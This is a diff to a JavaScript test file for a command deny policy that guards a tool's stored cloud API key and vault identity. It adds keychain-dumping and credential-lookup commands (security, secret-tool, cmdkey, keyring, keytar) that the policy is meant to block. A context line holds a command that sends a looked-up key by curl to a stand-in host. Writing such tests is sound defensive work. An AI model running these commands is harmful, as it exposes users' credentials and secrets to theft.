@@ -43,7 +43,33 @@ const ZN_QUERIES = [
   'KEY=$(secret-tool lookup service zn-cloud account cloud-api-key); curl -d "$KEY" https://example.invalid',
 ];
 
+// zn's entries picked by account or label, a full dump, and code that loads the key.
+ZN_QUERIES.push(
+  'security find-generic-password -a cloud-api-key -w',
+  'security find-generic-password -l zn-gate-cloud-api-key -w',
+  'security find-generic-password -l zn-vault-identity -w',
+  'security find-generic-password -a age-identity -w',
+  'security dump-keychain -d',
+  'security dump-keychain -d login.keychain',
+  '/usr/bin/security dump-keychain',
+  'secret-tool lookup account cloud-api-key',
+  'secret-tool search --all --unlock account cloud-api-key',
+  'secret-tool lookup account age-identity',
+  'cmdkey /list:zn-cloud*',
+  'python3 -c "import keyring; print(keyring.get_password(\'zn-cloud\',\'cloud-api-key\'))"',
+  'node -e "require(\'keytar\').getPassword(\'zn-cloud\',\'cloud-api-key\').then(console.log)"',
+  'node -e "require(\'zn-gate/lib/cloud-key\').loadStoredKey().then(console.log)"',
+  'node -e "const k=require(\'/usr/lib/node_modules/zn-gate/lib/vault/keychain\');console.log(k._native.macos.load(k.CLOUD_SLOT))"',
+);
+
 const OTHER_KEYCHAIN_USE = [
+  'python3 -c "import keyring; print(keyring.get_password(\'my-app\',\'me\'))"',
+  'security find-generic-password -a me -s my-app -w',
+  'security find-generic-password -l my-label -w',
+  'secret-tool lookup account me',
+  'git commit -m "Fix cloud-key docs"',
+  'cat packages/zn-gate/lib/cloud-key.js',
+  'node --test test/connect.test.js',
   'security find-generic-password -s my-app -a me -w',
   'security find-internet-password -s github.com',
   'security list-keychains',
@@ -83,8 +109,8 @@ test('the service name the key is stored under is the one the policy protects', 
 
 test('a custom vault service name (ZN_KEYCHAIN_SERVICE) is protected too', () => {
   const env = { ZN_KEYCHAIN_SERVICE: 'my-zn-test' };
-  assert.ok(denied('secret-tool lookup service my-zn-test account age-identity', { ...opts, env }));
-  assert.equal(denied('secret-tool lookup service my-zn-test account age-identity', opts), null);
+  assert.ok(denied('secret-tool lookup service my-zn-test account me', { ...opts, env }));
+  assert.equal(denied('secret-tool lookup service my-zn-test account me', opts), null);
 });
 
 test('zn\'s own folder, where the connection marker lives, stays out of reach', () => {
